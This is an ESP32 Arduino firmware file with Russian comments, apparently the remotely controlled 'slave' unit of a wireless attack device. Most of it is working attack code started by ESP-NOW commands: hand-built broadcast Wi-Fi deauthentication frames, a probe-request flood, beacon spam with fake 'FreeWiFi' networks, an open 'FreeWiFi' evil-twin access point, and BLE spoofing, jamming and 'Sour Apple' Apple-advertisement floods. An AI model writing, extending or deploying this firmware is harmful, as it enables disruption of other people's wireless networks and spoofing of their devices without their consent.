#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ===== СТРУКТУРА ДЛЯ ПРИЁМА КОМАНД =====
typedef struct struct_message {
  char command[16];
  char attack[16];
} struct_message;
struct_message myData;

bool attackRunning = false;
String currentAttack = "";

// ===== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ (получение MAC) =====
void getMacAddress(uint8_t *mac) {
  WiFi.macAddress(mac);
}

// ===== ОТПРАВКА DEAUTH (широковещательно) =====
void sendDeauth() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth_packet[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (заполнится)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (заполнится)
    0x00, 0x00,                         // Seq
    0x07, 0x00                          // Reason code
  };
  uint8_t mac[6];
  getMacAddress(mac);
  memcpy(&deauth_packet[10], mac, 6);
  memcpy(&deauth_packet[16], mac, 6);
  for (int i = 0; i < 100; i++) {
    if (!attackRunning) break;
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  Serial.println("✅ Deauth отправлен (100 пакетов)");
}

// ===== ОТПРАВКА PROBE FLOOD =====
void sendProbeFlood() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  uint8_t mac[6];
  getMacAddress(mac);
  char ssid[] = "ProbeTest";
  const int ssid_len = sizeof(ssid) - 1;
  uint8_t probe_packet[24 + 2 + ssid_len] = {
    0x40, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  };
  memcpy(&probe_packet[10], mac, 6);
  memcpy(&probe_packet[16], mac, 6);
  int pos = 24;
  probe_packet[pos++] = 0x00;
  probe_packet[pos++] = ssid_len;
  memcpy(&probe_packet[pos], ssid, ssid_len);
  pos += ssid_len;
  for (int i = 0; i < 50; i++) {
    if (!attackRunning) break;
    esp_wifi_80211_tx(WIFI_IF_STA, probe_packet, pos, false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  Serial.println("✅ Probe Flood отправлен (50 запросов)");
}

// ===== АТАКИ =====

void startBeaconSpam() {
  Serial.println("▶️ Beacon Spam запущен");
  for (int i = 0; i < 50; i++) {
    if (!attackRunning) break;
    String ssid = "FreeWiFi_" + String(random(1000, 9999));
    WiFi.softAP(ssid.c_str(), NULL, 1, 0, 1);
    delay(200);      // ← УВЕЛИЧИЛ ЗАДЕРЖКУ
    WiFi.softAPdisconnect(true);
  }
  Serial.println("✅ Beacon Spam завершён (50 сетей)");
}

void startDeauth() {
  Serial.println("▶️ Deauth запущен");
  sendDeauth();
}

void startProbeFlood() {
  Serial.println("▶️ Probe Flood запущен");
  sendProbeFlood();
}

void startWiFiScan() {
  Serial.println("▶️ Wi-Fi Scan запущен");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("Сетей не найдено");
  } else {
    Serial.print(n);
    Serial.println(" сетей найдено:");
    for (int i = 0; i < n; i++) {
      Serial.print(i + 1);
      Serial.print(": ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" (");
      Serial.print(WiFi.RSSI(i));
      Serial.print(" dBm) ");
      Serial.println((WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Открытая" : "Защищена");
    }
  }
  WiFi.scanDelete();
  Serial.println("✅ Wi-Fi Scan завершён");
}

void startEvilTwin() {
  Serial.println("▶️ Evil Twin запущен");
  WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
  Serial.println("✅ Точка доступа FreeWiFi создана (остановите stop)");
}

void startBLEScan() {
  Serial.println("▶️ BLE Scan запущен");
  BLEDevice::deinit();
  BLEDevice::init("");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults *foundDevices = pBLEScan->start(5, false);
  Serial.print("Найдено BLE устройств: ");
  Serial.println(foundDevices->getCount());
  for (int i = 0; i < foundDevices->getCount(); i++) {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    Serial.print("  ");
    Serial.print(device.getAddress().toString().c_str());
    Serial.print(" RSSI: ");
    Serial.print(device.getRSSI());
    if (device.haveName()) {
      Serial.print(" Name: ");
      Serial.print(device.getName().c_str());
    }
    Serial.println();
  }
  pBLEScan->clearResults();
  Serial.println("✅ BLE Scan завершён");
}

void startBLESpoofer() {
  Serial.println("▶️ BLE Spoofer запущен");
  BLEDevice::deinit();
  BLEDevice::init("ESP32-S3");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);

  // Исправление: передаём String, а не std::string
  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < sizeof(manufData); i++) {
    manufString += (char)manufData[i];
  }
  advertisementData.setManufacturerData(manufString);

  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  Serial.println("✅ Реклама BLE запущена (имя BLE_Spoofer)");
}

void startBLEJammer() {
  Serial.println("▶️ BLE Jammer запущен (имитация)");
  BLEDevice::deinit();
  BLEDevice::init("");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData data;
  data.setName("JAMMER");
  data.setFlags(0x06);
  pAdvertising->setAdvertisementData(data);
  pAdvertising->start();
  delay(5000);
  pAdvertising->stop();
  Serial.println("✅ BLE Jammer имитирован (5 секунд шума)");
}

void startSourApple() {
  Serial.println("▶️ Sour Apple запущен (имитация)");
  BLEDevice::deinit();
  BLEDevice::init("Apple");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;
  advData.setName("Apple");
  advData.setFlags(0x06);
  // Исправление: передаём String
  uint8_t appleData[] = {0x4C, 0x00, 0x0F, 0x05, 0x00, 0x00, 0x10, 0x00, 0x00};
  String appleString = "";
  for (int i = 0; i < sizeof(appleData); i++) {
    appleString += (char)appleData[i];
  }
  advData.setManufacturerData(appleString);
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  Serial.println("✅ Sour Apple запущен (эмуляция AirDrop)");
}

// ===== ЗАГЛУШКИ ДЛЯ МОДУЛЕЙ, КОТОРЫХ НЕТ =====
void startGhzScan() { Serial.println("⚠️ 2.4GHz Scanner требует NRF24"); }
void startProtokill() { Serial.println("⚠️ Protokill требует NRF24"); }
void startSubGhzReplay() { Serial.println("⚠️ Sub-GHz Replay требует CC1101"); }
void startSubGhzJammer() { Serial.println("⚠️ Sub-GHz Jammer требует CC1101"); }
void startIRReplay() { Serial.println("⚠️ IR Replay требует IR-диод"); }

// ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ WI-FI =====
void restoreWiFiState() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

// ===== ОСТАНОВКА АТАК =====
void stopAttack() {
  attackRunning = false;
  currentAttack = "";
  WiFi.softAPdisconnect(true);
  if (BLEDevice::getAdvertising()) {
    BLEDevice::getAdvertising()->stop();
  }
  BLEDevice::deinit();
  esp_wifi_set_promiscuous(false);
  restoreWiFiState();
  Serial.println("⏹️ Все атаки остановлены");
}

// ===== ОТПРАВКА PONG НА MASTER =====
void sendPong(const uint8_t *masterMac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, masterMac, 6);
  peer.channel = 1;
  peer.encrypt = false;
  
  if (!esp_now_is_peer_exist(masterMac)) {
    esp_now_add_peer(&peer);
  }
  
  struct_message response;
  strcpy(response.command, "pong");
  strcpy(response.attack, "");
  esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
}

// ===== ОБРАБОТЧИК ESP-NOW =====
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = info->src_addr;
#else
void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = mac_addr;
#endif
  if (len != sizeof(myData)) {
    Serial.printf("⚠️ Неверная длина пакета: %d (ожидалось %d)\n", len, sizeof(myData));
    return;
  }
  memcpy(&myData, incomingData, sizeof(myData));
  myData.command[15] = '\0';
  myData.attack[15] = '\0';

  if (strcmp(myData.command, "ping") == 0) {
    Serial.println("📩 Получен PING от MASTER, отправляю PONG...");
    sendPong(srcMac);
    return;
  }

  Serial.print("📩 Получено: команда ");
  Serial.print(myData.command);
  Serial.print(" | атака ");
  Serial.println(myData.attack);

  if (strcmp(myData.command, "start") == 0) {
    if (attackRunning) {
      Serial.println("⚠️ Атака уже запущена");
      return;
    }
    attackRunning = true;
    currentAttack = String(myData.attack);
    Serial.println("▶️ Запуск атаки запланирован в loop()");
  } else if (strcmp(myData.command, "stop") == 0) {
    stopAttack();
  } else {
    Serial.println("❌ Неизвестная команда");
  }
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false); // Отключаем спящий режим для надежной работы ESP-NOW

  // Принудительно настраиваем Wi-Fi на канал 1 для стабильного приема ESP-NOW
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  if (esp_now_init() != ESP_OK) {
    Serial.println("❌ ESP-NOW ошибка инициализации");
    return;
  }
  esp_now_register_recv_cb(OnDataRecv);
  Serial.println("✅ SLAVE готов к приёму команд");
  Serial.print("📡 Мой MAC: ");
  Serial.println(WiFi.macAddress());
}

// ===== LOOP =====
void loop() {
  if (attackRunning && currentAttack != "") {
    String attack = currentAttack;
    
    if (attack == "beacon") startBeaconSpam();
    else if (attack == "deauth") startDeauth();
    else if (attack == "probe") startProbeFlood();
    else if (attack == "wifi_scan") startWiFiScan();
    else if (attack == "evil_twin") startEvilTwin();
    else if (attack == "ble_scan") startBLEScan();
    else if (attack == "ble_spoofer") startBLESpoofer();
    else if (attack == "ble_jammer") startBLEJammer();
    else if (attack == "sour_apple") startSourApple();
    else if (attack == "ghz_scan") startGhzScan();
    else if (attack == "protokill") startProtokill();
    else if (attack == "subghz_replay") startSubGhzReplay();
    else if (attack == "subghz_jammer") startSubGhzJammer();
    else if (attack == "ir_replay") startIRReplay();
    
    // Сбрасываем флаги для разовых/завершенных атак, если они не были остановлены извне
    if (currentAttack == attack && attack != "evil_twin" && attack != "ble_spoofer" && attack != "sour_apple") {
      attackRunning = false;
      currentAttack = "";
      restoreWiFiState();
    }
  }
  delay(10);
}
